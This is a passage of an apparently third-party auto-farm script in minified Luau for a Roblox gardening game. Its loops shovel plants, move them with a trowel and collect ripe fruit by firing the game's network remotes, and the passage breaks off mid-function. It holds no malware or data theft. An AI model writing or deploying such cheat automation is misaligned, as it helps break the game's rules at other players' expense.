		for V, y in ipairs(g.AllSeedsDataTable) do
			if type(y) ~= "table" then
				continue
			end
			local Z = y.name
			if type(Z) ~= "string" or Z == "" then
				continue
			end
			if y.single == true then
				continue
			end
			G[Z] = true
		end
		return G
	end,
	GetPlantIdPlantShovel = function(G, V)
		return Z.FruitFiltersDataSync.GetPlantIdFruitFiltersDataSync(nil, G, V)
	end,
	GetPlantNamePlantShovel = function(G, V)
		if type(G) == "table" then
			local V = tostring(G.PlantName or G.SeedName or "")
			if V ~= "" then
				return V
			end
		end
		if typeof(V) == "Instance" and V.Parent then
			return tostring(V:GetAttribute("SeedName") or V:GetAttribute("PlantName") or "")
		end
		return ""
	end,
	IsValidPlant = function(G, V)
		local y = Z.PlantShovel.GetPlantNamePlantShovel(G, V)
		if type(y) ~= "string" or y == "" then
			return false, nil
		end
		if Z.SeedData.IsSingleHarvest(y) then
			return false, y
		end
		if Z.PlantShovel.GetPlantIdPlantShovel(G, V) == "" then
			return false, y
		end
		return true, y
	end;
	IsFullyGrown = function(G, V)
		local y = Z.FruitFiltersDataSync
		if type(G) == "table" and (y and type(y.IsPlantReady) == "function") then
			local V, Z = pcall(y.IsPlantReady, G)
			if V then
				return Z == true
			end
		end
		local j = tonumber(type(G) == "table" and ((G.Age or G.CurrentAge)) or nil)
		local i = tonumber(type(G) == "table" and G.MaxAge or nil)
		if ((not j or not i)) and (typeof(V) == "Instance" and V.Parent) then
			j = tonumber(V:GetAttribute("Age") or V:GetAttribute("CurrentAge") or j)
			i = tonumber(V:GetAttribute("MaxAge") or i)
		end
		if not j or not i or i <= 0 then
			return false
		end
		return j >= i
	end,
	GetPlantData = function(G, V)
		local y, j = Z.PlantShovel.IsValidPlant(G, V)
		if not y then
			return nil
		end
		local i = tonumber(type(G) == "table" and ((G.Height or G.Length or G.PlantLength)) or nil)
		if not i and (typeof(V) == "Instance" and V.Parent) then
			i = tonumber(V:GetAttribute("Height") or V:GetAttribute("Length") or V:GetAttribute("PlantLength"))
		end
		local c = ""
		if type(G) == "table" then
			c = tostring(G.Mutation or G.mutation or "")
			if c == "" or c == "Normal" then
				c = tostring(G.Variant or G.variant or "")
			end
		end
		if ((c == "" or c == "Normal")) and (typeof(V) == "Instance" and V.Parent) then
			c = tostring(V:GetAttribute("Mutation") or V:GetAttribute("Variant") or V:GetAttribute("PlantVariant") or "")
		end
		if c == "Normal" or c == "nil" then
			c = ""
		end
		return {
			ob = V;
			data = G,
			id = Z.PlantShovel.GetPlantIdPlantShovel(G, V),
			name = j;
			height = i,
			mutation = c,
			grown = Z.PlantShovel.IsFullyGrown(G, V)
		}
	end,
	IsVariantBlacklisted = function(G)
		local V = h.shovel_plant_variant_blacklist
		if type(V) ~= "table" or next(V) == nil then
			return false
		end
		if type(G) ~= "string" or G == "" then
			return false
		end
		return V[G]
	end,
	PassesVariant = function(G)
		local V = h.shovel_plant_variants
		if type(V) ~= "table" or next(V) == nil then
			return true
		end
		if type(G) ~= "string" or G == "" then
			return false
		end
		return V[G]
	end,
	PassesFilters = function(G)
		if type(G) ~= "table" then
			return false
		end
		local V = h.shovel_plant_types
		if type(V) ~= "table" or not V[G.name] then
			return false
		end
		local y = tonumber(h.shovel_plant_min_height) or 0
		local j = tonumber(h.shovel_plant_max_height) or 200
		local i = tonumber(G.height)
		if i then
			if i < y or i > j then
				return false
			end
		elseif y > 0 or j < 200 then
			return false
		end
		if not h.shovel_growing_plants and not G.grown then
			return false
		end
		if not Z.PlantShovel.PassesVariant(G.mutation) then
			return false
		end
		if Z.PlantShovel.IsVariantBlacklisted(G.mutation) then
			return false
		end
		return true
	end,
	GetPlantsToShovel = function()
		local G = {}
		local V = {}
		local y = h.shovel_plant_types
		local j = Z.FruitFiltersDataSync
		if type(y) ~= "table" or not j or type(j.GetPlantEntriesFruitFiltersDataSync) ~= "function" then
			return G, V
		end
		for j, i in ipairs(j.GetPlantEntriesFruitFiltersDataSync()) do
			local c = Z.PlantShovel.GetPlantData(i.data, i.physical)
			if not c or not y[c.name] then
				continue
			end
			V[c.name] = ((V[c.name] or 0)) + 1
			if Z.PlantShovel.PassesFilters(c) then
				table.insert(G, c)
			end
		end
		return G, V
	end,
	ShovelPlant = function(G, V)
		if type(G) ~= "table" or type(G.id) ~= "string" or G.id == "" then
			return false
		end
		if not Z.Player.IsToolHeld(V) then
			return false
		end
		return Z.ShovelTool.Use(G.id, "", V)
	end;
	Run = function()
		if not h.auto_shovel_plants then
			Z.PlantShovel.ClearStatus()
			return 0
		end
		local G = h.shovel_plant_types
		if type(G) ~= "table" or next(G) == nil then
			Z.PlantShovel.SetStatus("Paused: select plant types", "#FFCC66")
			return 0
		end
		local V, y = Z.PlantShovel.GetPlantsToShovel()
		local j = math.max(math.floor(tonumber(h.shovel_plants_keep) or 0), 0)
		if # V == 0 then
			Z.PlantShovel.SetStatus("Nothing to shovel", "#CFCFCF")
			return 0
		end
		local i
		local c = false
		local J = 0
		for G, V in ipairs(V) do
			if not h.auto_shovel_plants then
				break
			end
			if J >= Z.PlantShovel.MaxPerLoop then
				break
			end
			local T = V.name
			local d = y[T] or 0
			if d <= j then
				continue
			end
			if not i then
				i, c = Z.ShovelTool.Equip()
				if not i then
					Z.PlantShovel.SetStatus("Paused: shovel not found", "#FF6B6B")
					return J
				end
			end
			if not Z.Player.IsToolHeld(i) then
				i, c = Z.ShovelTool.Equip()
				if not i then
					break
				end
			end
			Z.PlantShovel.SetStatus(string.format("Shovelling %s %d/%d", T, d, j), "#FF5555")
			if Z.PlantShovel.ShovelPlant(V, i) then
				y[T] = d - 1
				J += 1
				task.wait(Z.PlantShovel.RequestDelay)
			end
		end
		Z.ShovelTool.Cleanup(c)
		if J == 0 then
			Z.PlantShovel.SetStatus("Nothing above keep limit", "#CFCFCF")
		end
		return J
	end,
	LoopPlantShovel = function()
		if not h.auto_shovel_plants then
			Z.PlantShovel.ClearStatus()
			return 0
		end
		local G, V = pcall(function()
			return Z.PlantShovel.Run()
		end)
		if not G then
			Z.Player.UnequipTools()
			Z.PlantShovel.SetStatus("Error: plant shovel loop failed", "#FF4444")
			warn("[PlantShovel] Loop error:", V)
			return 0
		end
		return tonumber(V) or 0
	end
}
g.TrowelRunning = false
g.TrowelStatusText = ""
g.TrowelDebugEnabled = false
g.TrowelMovedPositionCacheById = g.TrowelMovedPositionCacheById or {}
Z.Trowel = {
	MaxPerLoop = 10;
	RequestDelay = .35,
	StudsValid = 2.5;
	SetStatus = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.TrowelStatusText = ""
			return
		end
		g.TrowelStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\147\141 [Trowel]</font> <font color=\'%s\'>%s</font></stroke>", V or "#FFFFFF", G)
	end;
	ClearStatus = function()
		g.TrowelStatusText = ""
	end;
	GetAllSelection = function()
		local G = {}
		for V, y in ipairs(g.AllSeedsDataTable) do
			if type(y) == "table" and type(y.name) == "string" then
				G[y.name] = true
			end
		end
		return G
	end,
	GetTool = function()
		for G, V in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if V:IsA("Tool") and V:GetAttribute("Trowel") ~= nil then
				local G = Z.StackKeepOverrides.GetGearNameFromToolStackKeepOverrides(V, "Trowel")
				local y = Z.Trowel.GetTrowelCount(V)
				if not Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Gear", G, y) then
					return V
				end
			end
		end
		return nil
	end;
	GetTrowelCount = function(G)
		if typeof(G) == "Instance" and (G.Parent and (G:IsA("Tool") and G:GetAttribute("Trowel") ~= nil)) then
			return math.max(math.floor(tonumber(G:GetAttribute("Count")) or 0), 0)
		end
		local V = 0
		for G, y in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if y:IsA("Tool") and y:GetAttribute("Trowel") ~= nil then
				V += math.max(math.floor(tonumber(y:GetAttribute("Count")) or 0), 0)
			end
		end
		return V
	end;
	WaitForTrowelCountDrop = function(G, V)
		V = math.max(math.floor(tonumber(V) or 0), 0)
		if V <= 0 then
			return false, V
		end
		local y = os.clock()
		local j = Z.Trowel.GetTrowelCount(G)
		repeat
			j = Z.Trowel.GetTrowelCount(G)
			if j < V then
				return true, j
			end
			task.wait(.05)
		until os.clock() - y >= 1.5
		return false, j
	end,
	FormatVectorTrowel = function(G)
		if typeof(G) ~= "Vector3" then
			return nil
		end
		return {
			x = G.X;
			y = G.Y;
			z = G.Z
		}
	end;
	IsPlantAtTargetTrowel = function(G, V)
		if typeof(G) ~= "Vector3" or typeof(V) ~= "Vector3" then
			return false
		end
		local y = Vector3.new(G.X, 0, G.Z)
		local j = Vector3.new(V.X, 0, V.Z)
		local i = ((y - j)).Magnitude
		local c = math.abs(G.Y - V.Y)
		return i < Z.Trowel.StudsValid and c < Z.Trowel.StudsValid
	end;
	DebugTrowel = function(G, V)
		if g.TrowelDebugEnabled ~= true then
			return false
		end
		warn("[TrowelDebug] " .. tostring(G or "debug"))
		if V ~= nil then
			local G, Z = pcall(y.HttpService.JSONEncode, y.HttpService, V)
			warn("[TrowelDebugData] " .. tostring(G and Z or V))
		end
		return true
	end;
	EquipTool = function()
		local G = Z.Trowel.GetTool()
		if not G then
			return nil, false
		end
		if Z.Player.IsToolHeld(G) then
			return G, false
		end
		Z.Player.UnequipTools()
		if not Z.Player.EquipTool(G) then
			return nil, false
		end
		task.wait(.2)
		if not Z.Player.IsToolHeld(G) then
			return nil, false
		end
		return G, true
	end,
	GetSavedPositionText = function()
		local G = h.trowel_saved_position
		if type(G) ~= "table" then
			return "\240\159\147\141 Saved Position: Not set"
		end
		local V = tostring(G.area or "")
		local y = tonumber(G.x)
		local Z = tonumber(G.z)
		if V == "" or not y or not Z then
			return "\240\159\147\141 Saved Position: Not set"
		end
		return string.format("\240\159\147\141 Saved Position: %s | X %.2f | Z %.2f", V, y, Z)
	end;
	SavePlayerPosition = function()
		local G = y.Character and y.Character:FindFirstChild("HumanoidRootPart")
		if not G then
			return false, "Character not found"
		end
		local V, j = Z.Farm.GetPlantAreaAtPosition(G.Position)
		if not V or typeof(j) ~= "Vector3" then
			return false, "Stand inside your farm"
		end
		h.trowel_saved_position = {
			area = V.Name,
			x = j and j.X;
			z = j and j.Z
		}
		a.Save.SaveDataSync()
		return true, V.Name
	end,
	GetFarmMiddleRightPositionTrowel = function()
		local G = Z.Farm.GetPermanentCenterPosition()
		if typeof(G) ~= "Vector3" then
			return nil
		end
		local V
		local y = math.huge
		for Z, j in ipairs(Z.FarmGrid.GetPlantAreasFarmGrid(Z.ControlMode.RightCol)) do
			local i = type(j) == "table" and j.area or nil
			if typeof(i) ~= "Instance" or not i:IsA("BasePart") then
				continue
			end
			local c = i.CFrame:PointToObjectSpace(G)
			local J = math.clamp(c.X, - i.Size.X / 2, i.Size.X / 2)
			local T = math.clamp(c.Z, - i.Size.Z / 2, i.Size.Z / 2)
			local d = i.CFrame:PointToWorldSpace(Vector3.new(J, i.Size.Y / 2, T))
			local u = ((d - G)).Magnitude
			if u < y then
				y = u
				V = d
			end
		end
		return V
	end,
	GetDefaultPlacementPositionTrowel = function(G)
		local V, y, j = Z.Farm.GetPlacementPositionFarm(G)
		if j ~= W.Default then
			return V, j
		end
		return Z.Trowel.GetFarmMiddleRightPositionTrowel(), j
	end,
	GetTargetPosition = function()
		local G, V = Z.TotalControl.ResolveTrowelTargetPositionTotalControl()
		if G ~= nil then
			if typeof(G) == "Vector3" then
				return G
			end
			return nil, tostring(V or "Farm middle not found")
		end
		if h.trowel_use_fixed_spot then
			local G = tostring(h.trowel_fixed_placement or "")
			if not Z.Farm.IsPlacementModeFarm(G) then
				G = W.UseDefault
			end
			local V, y = Z.Trowel.GetDefaultPlacementPositionTrowel(G)
			if typeof(V) ~= "Vector3" then
				return nil, tostring(y or "Farm position") .. " not found"
			end
			return V
		end
		local y = h.trowel_saved_position
		if type(y) ~= "table" then
			return nil, "Copy your position inside the farm"
		end
		local j = Z.Farm.GetPlantArea(y.area)
		local i = tonumber(y.x)
		local c = tonumber(y.z)
		if not j or not i or not c then
			return nil, "Copy your position inside the farm"
		end
		if math.abs(i) > j.Size.X / 2 or math.abs(c) > j.Size.Z / 2 then
			return nil, "Saved position is outside your farm"
		end
		return j.CFrame:PointToWorldSpace(Vector3.new(i, j.Size.Y / 2, c))
	end,
	GetPlantIdTrowel = function(G, V, y)
		G = tostring(G or "")
		if G ~= "" then
			return G
		end
		if type(V) == "table" then
			G = tostring(V.Id or V.PlantId or V.PlantID or V.ID or "")
			if G ~= "" then
				return G
			end
		end
		if typeof(y) == "Instance" and y.Parent then
			return tostring(y:GetAttribute("PlantId") or y:GetAttribute("PlantID") or y:GetAttribute("Id") or y.Name or "")
		end
		return ""
	end,
	GetDataLocalPositionTrowel = function(G)
		local V = type(G) == "table" and G.Positions or nil
		if type(V) ~= "table" then
			return nil
		end
		local y = tonumber(V.PosX)
		local Z = tonumber(V.PosY)
		local j = tonumber(V.PosZ)
		if not y or not Z or not j then
			return nil
		end
		return Vector3.new(y, Z, j)
	end,
	GetDataWorldPositionTrowel = function(G)
		local V = Z.Trowel.GetDataLocalPositionTrowel(G)
		local y = Z.Farm.GetSpawnPoint()
		if typeof(V) ~= "Vector3" or typeof(y) ~= "Instance" or not y:IsA("BasePart") then
			return nil
		end
		return y.CFrame:PointToWorldSpace(V)
	end;
	GetWorldToDataLocalPositionTrowel = function(G)
		local V = Z.Farm.GetSpawnPoint()
		if typeof(G) ~= "Vector3" or typeof(V) ~= "Instance" or not V:IsA("BasePart") then
			return nil
		end
		return V.CFrame:PointToObjectSpace(G)
	end,
	GetDataWorldRotationTrowel = function(G)
		G = tonumber(G)
		if not G then
			return nil
		end
		local V = Z.Farm.GetSpawnPoint()
		if typeof(V) ~= "Instance" or not V:IsA("BasePart") then
			return G
		end
		local y = CFrame.new(Vector3.new(0, 0, 0)) * CFrame.Angles(0, math.rad(G), 0)
		local j, i, c = (V.CFrame:ToWorldSpace(y)):ToEulerAnglesYXZ()
		return math.deg(i)
	end;
	GetPlantPositionTrowel = function(G, V)
		if typeof(V) == "Instance" and (V.Parent and V:GetAttribute("emove") ~= true) then
			local G, y = pcall(function()
				return V:GetPivot()
			end)
			if G and typeof(y) == "CFrame" then
				return y.Position
			end
		end
		return Z.Trowel.GetDataWorldPositionTrowel(G)
	end,
	GetPlantRotationTrowel = function(G, V)
		if typeof(V) == "Instance" and (V.Parent and V:GetAttribute("emove") ~= true) then
			local G, y = pcall(function()
				if V:IsA("Model") and V.PrimaryPart then
					return V.PrimaryPart.CFrame
				end
				return V:GetPivot()
			end)
			if G and typeof(y) == "CFrame" then
				local G, V, Z = y:ToEulerAnglesYXZ()
				return math.deg(V)
			end
		end
		local y = type(G) == "table" and G.Positions or nil
		return Z.Trowel.GetDataWorldRotationTrowel(type(y) == "table" and y.Rotation or nil) or 0
	end;
	FindPhysicalPlantByIdTrowel = function(G)
		G = tostring(G or "")
		if G == "" then
			return nil, false
		end
		local V = Z.Farm.GetMyPlantsFolder()
		if not V then
			return nil, false
		end
		for V, y in ipairs(V:GetChildren()) do
			if typeof(y) == "Instance" and (y.Parent and Z.Trowel.GetPlantIdTrowel(nil, nil, y) == G) then
				if y:GetAttribute("emove") == true then
					return nil, true
				end
				return y, false
			end
		end
		return nil, false
	end;
	ResolvePlantPositionTrowel = function(G, V, y)
		G = Z.Trowel.GetPlantIdTrowel(G, V, y)
		local j = Z.FruitFiltersDataSync
		local i = type(V) == "table" and V or j and (type(j.Plants) == "table" and j.Plants[G]) or nil
		local c = Z.Trowel.GetDataLocalPositionTrowel(i)
		local J = Z.Trowel.GetDataWorldPositionTrowel(i)
		local T, d = Z.Trowel.FindPhysicalPlantByIdTrowel(G)
		if T then
			local G = Z.Trowel.GetPlantPositionTrowel(nil, T)
			return {
				position = G;
				rotation = Z.Trowel.GetPlantRotationTrowel(nil, T),
				source = "physical";
				physical = T;
				physicalUsed = true;
				physicalPosition = G;
				physicalSkippedEmove = false,
				dataLocalPosition = c;
				dataWorldPosition = J
			}
		end
		local u = g.TrowelMovedPositionCacheById[G]
		if type(u) == "table" and typeof(u.position) == "Vector3" then
			return {
				position = u.position,
				rotation = tonumber(u.rotation) or 0,
				source = u.source or "manual_trowel";
				physicalUsed = false;
				physicalPosition = nil;
				physicalSkippedEmove = d == true,
				dataLocalPosition = c;
				dataWorldPosition = J
			}
		end
		return {
			position = J;
			rotation = Z.Trowel.GetPlantRotationTrowel(i, nil),
			source = "data_cache";
			physicalUsed = false;
			physicalPosition = nil,
			physicalSkippedEmove = d == true;
			dataLocalPosition = c;
			dataWorldPosition = J
		}
	end;
	UpdateMovedPlantCacheTrowel = function(G, V, y, j)
		local i = {
			replacedDataCache = false
		}
		if typeof(y) ~= "Vector3" then
			return nil, i
		end
		G = Z.Trowel.GetPlantIdTrowel(G, V, nil)
		if G == "" then
			return nil, i
		end
		j = tonumber(j) or 0
		g.TrowelMovedPositionCacheById[G] = {
			position = y,
			rotation = j,
			timestamp = os.clock(),
			source = "manual_trowel"
		}
		local c = Z.FruitFiltersDataSync
		local J = type(V) == "table" and V or c and (type(c.Plants) == "table" and c.Plants[G]) or nil
		for V = 1, 5, 1 do
			task.wait(.05)
			J = c and (type(c.Plants) == "table" and c.Plants[G]) or J
			local j = Z.Trowel.GetDataWorldPositionTrowel(J)
			if Z.Trowel.IsPlantAtTargetTrowel(j, y) then
				i.newDataLocalPosition = Z.Trowel.GetDataLocalPositionTrowel(J)
				i.newDataWorldPosition = j
				return J, i
			end
		end
		local T = Z.Trowel.GetWorldToDataLocalPositionTrowel(y)
		if type(J) == "table" and typeof(T) == "Vector3" then
			J.Positions = type(J.Positions) == "table" and J.Positions or {}
			J.Positions.PosX = T.X
			J.Positions.PosY = T.Y
			J.Positions.PosZ = T.Z
			J.Positions.Rotation = j
			J.LastUpdate = c and (type(c.Now) == "function" and c.Now()) or os.clock()
			i.replacedDataCache = true
			i.replacedDataLocalPosition = T
			i.replacedDataWorldPosition = Z.Trowel.GetDataWorldPositionTrowel(J)
			i.newDataLocalPosition = Z.Trowel.GetDataLocalPositionTrowel(J)
			i.newDataWorldPosition = Z.Trowel.GetDataWorldPositionTrowel(J)
		end
		return J, i
	end,
	GetPlants = function(G)
		local V = {}
		local y = h.trowel_plant_types
		local j = type(y) == "table" and next(y) ~= nil
		local i = {}
		local c = Z.FruitFiltersDataSync
		if c and (not c.Started and type(c.StartSync) == "function") then
			c.StartSync()
		end
		if c and type(c.Plants) == "table" then
			for c, J in pairs(c.Plants) do
				if type(J) ~= "table" or J.Removed then
					continue
				end
				local T = tostring(J.PlantName or "")
				if T == "" or j and y[T] ~= true then
					continue
				end
				local d = Z.Trowel.GetPlantIdTrowel(c, J, nil)
				if d == "" then
					continue
				end
				local u = Z.Trowel.ResolvePlantPositionTrowel(d, J, nil)
				local q = u.position
				if Z.Trowel.IsPlantAtTargetTrowel(q, G) then
					i[d] = true
					continue
				end
				i[d] = true
				table.insert(V, {
					id = d,
					name = T;
					data = J,
					physical = u.physical;
					position = q;
					positionSource = u.source;
					rotation = u.rotation
				})
			end
		end
		local J = Z.Farm.GetMyPlantsFolder()
		if J then
			for c, J in ipairs(J:GetChildren()) do
				if not J:IsA("Model") or J:GetAttribute("emove") == true then
					continue
				end
				local T = Z.Trowel.GetPlantIdTrowel(nil, nil, J)
				if T == "" or i[T] then
					continue
				end
				local d = tostring(J:GetAttribute("SeedName") or "")
				if d == "" or j and y[d] ~= true then
					continue
				end
				local u = Z.Trowel.ResolvePlantPositionTrowel(T, nil, J)
				local q = u.position
				if Z.Trowel.IsPlantAtTargetTrowel(q, G) then
					continue
				end
				table.insert(V, {
					id = T;
					name = d,
					physical = J,
					position = q;
					positionSource = u.source;
					rotation = u.rotation
				})
			end
		end
		return V
	end,
	MovePlant = function(G, V, j)
		if type(G) ~= "table" or typeof(V) ~= "Vector3" then
			return false
		end
		local i = y.Networking and (y.Networking.Trowel and y.Networking.Trowel.MovePlant)
		if not i or type(i.Fire) ~= "function" then
			return false
		end
		local c = tostring(G.id or "")
		if c == "" then
			c = Z.Trowel.GetPlantIdTrowel(nil, G.data, G.physical or G.ob)
		end
		if c == "" then
			return false
		end
		local J = Z.Trowel.ResolvePlantPositionTrowel(c, G.data, G.physical or G.ob)
		local T = J.dataLocalPosition or Z.Trowel.GetDataLocalPositionTrowel(G.data)
		local d = J.dataWorldPosition or Z.Trowel.GetDataWorldPositionTrowel(G.data)
		local u = tonumber(G.rotation)
		if not u then
			u = tonumber(J.rotation) or Z.Trowel.GetPlantRotationTrowel(G.data, G.physical or G.ob)
		end
		local q = Z.Trowel.GetTrowelCount(j)
		local g = Z.StackKeepOverrides.GetGearNameFromToolStackKeepOverrides(j, "Trowel")
		if Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Gear", g, q) then
			return false
		end
		local E = pcall(function()
			i:Fire(c, V, u)
		end)
		local a = false
		local H = q
		if E then
			a, H = Z.Trowel.WaitForTrowelCountDrop(j, q)
		end
		local r, Y = nil, {
			replacedDataCache = false
		}
		if a then
			r, Y = Z.Trowel.UpdateMovedPlantCacheTrowel(c, G.data, V, u)
		end
		Y = type(Y) == "table" and Y or {
			replacedDataCache = false
		}
		Z.Trowel.DebugTrowel("move result", {
			plantId = c;
			plantName = tostring(G.name or ""),
			oldDataLocalPosition = Z.Trowel.FormatVectorTrowel(T),
			oldDataWorldPosition = Z.Trowel.FormatVectorTrowel(d);
			physicalUsed = J.physicalUsed == true,
			physicalPosition = Z.Trowel.FormatVectorTrowel(J.physicalPosition),
			physicalSkippedEmove = J.physicalSkippedEmove == true,
			targetWorldPosition = Z.Trowel.FormatVectorTrowel(V),
			beforeCount = q,
			afterCount = H,
			countDecreased = a == true,
			newDataLocalPosition = Z.Trowel.FormatVectorTrowel(Y.newDataLocalPosition or Z.Trowel.GetDataLocalPositionTrowel(r));
			newDataWorldPosition = Z.Trowel.FormatVectorTrowel(Y.newDataWorldPosition or Z.Trowel.GetDataWorldPositionTrowel(r));
			replacedDataCache = Y.replacedDataCache == true;
			replacedDataLocalPosition = Z.Trowel.FormatVectorTrowel(Y.replacedDataLocalPosition);
			replacedDataWorldPosition = Z.Trowel.FormatVectorTrowel(Y.replacedDataWorldPosition)
		})
		return a == true
	end,
	Start = function()
		if h.auto_trowel_plants == true then
			return false
		end
		h.auto_trowel_plants = true
		Z.Trowel.SetStatus("Starting...", "#66CCFF")
		a.Save.SaveDataSync()
		return true
	end,
	Stop = function(G)
		h.auto_trowel_plants = false
		g.TrowelRunning = false
		Z.Player.UnequipTools()
		Z.Trowel.ClearStatus()
		a.Save.SaveDataSync()
		if type(G) == "string" and G ~= "" then
			g.Notify(G, 3)
		end
	end;
	Run = function()
		local G = Z.TotalControl.ResolveTrowelEnabledTotalControl() == true
		if not G and h.auto_trowel_plants ~= true then
			g.TrowelRunning = false
			Z.Trowel.ClearStatus()
			return 0
		end
		local V, y = Z.Trowel.GetTargetPosition()
		if not V then
			Z.Trowel.SetStatus("Paused: " .. tostring(y or "target not found"), "#FFCC66")
			return 0
		end
		local j = Z.Trowel.GetPlants(V)
		if # j == 0 then
			Z.Trowel.SetStatus("No plants to move", "#CFCFCF")
			return 0
		end
		local i, c = Z.Trowel.EquipTool()
		if not i then
			Z.Trowel.SetStatus("Paused: trowel not found", "#FFCC66")
			return 0
		end
		g.TrowelRunning = true
		local J = 0
		local T = false
		for y, c in ipairs(j) do
			if (not G and h.auto_trowel_plants ~= true) or J >= Z.Trowel.MaxPerLoop then
				break
			end
			if not Z.Player.IsToolHeld(i) then
				Z.Trowel.SetStatus("Paused: trowel unequipped or ran out", "#FFCC66")
				T = true
				break
			end
			local d = Z.StackKeepOverrides.GetGearNameFromToolStackKeepOverrides(i, "Trowel")
			local u = Z.Trowel.GetTrowelCount(i)
			if Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Gear", d, u) then
				Z.Trowel.SetStatus("Paused: trowel not found", "#FFCC66")
				T = true
				break
			end
			Z.Trowel.SetStatus(string.format("Moving %s %d/%d", c.name, y, # j), "#FFD966")
			if Z.Trowel.MovePlant(c, V, i) then
				J += 1
				task.wait(Z.Trowel.RequestDelay)
			end
		end
		if c then
			Z.Player.UnequipTools()
		end
		g.TrowelRunning = false
		local d = G or h.auto_trowel_plants == true
		if d and (J > 0 and not T) then
			Z.Trowel.SetStatus(string.format("Moved %d/%d | Waiting", J, # j), "#7CFC00")
		elseif d and not T then
			Z.Trowel.SetStatus("No plants moved | Waiting", "#FFCC66")
		elseif not d then
			Z.Trowel.ClearStatus()
		end
		return J
	end,
	Loop = function()
		local G, V = pcall(Z.Trowel.Run)
		if not G then
			g.TrowelRunning = false
			Z.Player.UnequipTools()
			Z.Trowel.SetStatus("Error: trowel loop failed", "#FF4444")
			warn("[Trowel]", V)
			return 0
		end
		return tonumber(V) or 0
	end
}
Z.FruitCollect = {
	FruitBucket = {};
	FruitBucketIndex = 1;
	IsMaxFruitInventory = function()
		local G = Z.PlayerData.GetFruitCount()
		local V = Z.PlayerData.GetMaxFruitCapacity()
		if G >= V then
			return true
		end
		return false
	end;
	IsFarFromGarden = function()
		if not Z.Farm.IsNearFarm(100) then
			return true
		end
		return false
	end;
	GetTextCurrentInventoryFruitStats = function()
		local G = Z.PlayerData.GetFruitCount() or 0
		local V = Z.PlayerData.GetMaxFruitCapacity() or 1
		local y = math.clamp(G / V, 0, 1)
		local j
		if y < .5 then
			j = (Color3.new(0, 1, 0)):Lerp(Color3.new(1, 1, 0), y * 2)
		else
			j = (Color3.new(1, 1, 0)):Lerp(Color3.new(1, .2, 0), ((y - .5)) * 2)
		end
		local i = string.format("#%02X%02X%02X", math.floor(j.R * 255), math.floor(j.G * 255), math.floor(j.B * 255))
		local c = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\140\177 [Fruit Collector]</font> <font color=\'%s\'>Fruits (%d/%d)</font></stroke>", i, G, V)
		return c
	end,
	CollectFruit = function(G, V)
		if type(G) ~= "string" or G == "" then
			return false
		end
		V = type(V) == "string" and V or ""
		if not y.CollectFruitNet or type(y.CollectFruitNet.Fire) ~= "function" then
			return false
		end
		y.CollectFruitNet:Fire(G, V)
		return true
	end;
	ResetBucket = function()
		Z.FruitCollect.FruitBucket = {}
		Z.FruitCollect.FruitBucketIndex = 1
	end,
	GetReadyFruitsFromSync = function()
		local G = y.GardenSyncController
		if type(G) ~= "table" or type(G.GetGarden) ~= "function" then
			return nil
		end
		local V, j = pcall(function()
			return G:GetGarden(g.player_userid)
		end)
		if not V or type(j) ~= "table" or next(j) == nil then
			return nil
		end
		local i = {}
		for G, V in pairs(j) do
			if type(V) ~= "table" then
				continue
			end
			local y = V.PlantName
			if type(y) ~= "string" or y == "" then
				continue
			end
			local j = tostring(G or "")
			if j == "" then
				continue
			end
			local c = V.Fruits
			if type(c) == "table" and next(c) ~= nil then
				for G, V in pairs(c) do
					if type(V) ~= "table" then
						continue
					end
					local c = tonumber(V.Age) or 0
					local J = tonumber(V.MaxAge) or 0
					if J > 0 and c >= J then
						local c = Z.FruitFilters.BuildFruitData(nil, nil, y, j, tostring(G or ""), V)
						if c and Z.FruitFilters.PassesCollectorFilters(c) then
							table.insert(i, c)
						end
					end
				end
			elseif Z.SeedData.IsSingleHarvest(y) then
				local G = tonumber(V.Age) or 0
				local c = tonumber(V.MaxAge) or 0
				if c > 0 and G >= c then
					local G = Z.FruitFilters.BuildFruitData(nil, nil, y, j, "", V)
					if G and Z.FruitFilters.PassesCollectorFilters(G) then
						table.insert(i, G)
					end
				end
			end
		end
		return i
	end,
	GetCollectSortModeFruitCollect = function()
		local G = Z.TotalControl
		local V = G and (type(G.ResolveFruitCollectSortModeTotalControl) == "function" and G.ResolveFruitCollectSortModeTotalControl()) or nil
		local y = tostring(V or h.collect_sort_mode or "Default")
		if y == "Highest Price > Lowest" or y == "Lowest Price > Highest" then
			return y
		end
		return "Default"
	end;
	GetCollectLivePriceFruitCollect = function(G)
		if type(G) ~= "table" then
			return 0, 1, "none"
		end
		local V = tostring(G.name or G.Name or G.PlantName or "")
		if V == "" or type(Z.BuySelectFruit) ~= "table" or type(Z.BuySelectFruit.GetEstimatedPriceBuySelectFruit) ~= "function" then
			return 0, 1, "none"
		end
		if type(Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit) == "function" then
			Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit(false)
		elseif type(Z.BuySelectFruit.UpdateFruitStockBuySelectFruit) == "function" then
			Z.BuySelectFruit.UpdateFruitStockBuySelectFruit(false)
		end
		local y, j, i = Z.BuySelectFruit.GetEstimatedPriceBuySelectFruit(V, G.sourceData, G.m)
		return math.max(math.floor(tonumber(y) or 0), 0), tonumber(j) or 1, tostring(i or "none")
	end;
	SortReadyFruitBucketByLivePriceFruitCollect = function(G)
		if type(G) ~= "table" or # G <= 1 then
			return G
		end
		local V = Z.FruitCollect.GetCollectSortModeFruitCollect()
		if V == "Default" then
			return G
		end
		for G, V in ipairs(G) do
			if type(V) == "table" then
				local G, y, j = Z.FruitCollect.GetCollectLivePriceFruitCollect(V)
				V.collect_live_price = G
				V.collect_live_multiplier = y
				V.collect_live_tier = j
			end
		end
		table.sort(G, function(G, y)
			local Z = tonumber(G and G.collect_live_price) or 0
			local j = tonumber(y and y.collect_live_price) or 0
			if Z ~= j then
				if V == "Lowest Price > Highest" then
					return Z < j
				end
				return Z > j
			end
			local i = tonumber(G and G.collect_live_multiplier) or 1
			local c = tonumber(y and y.collect_live_multiplier) or 1
			if i ~= c then
				if V == "Lowest Price > Highest" then
					return i < c
				end
				return i > c
			end
			local J = tonumber(G and G.w) or 0
			local T = tonumber(y and y.w) or 0
			if J ~= T then
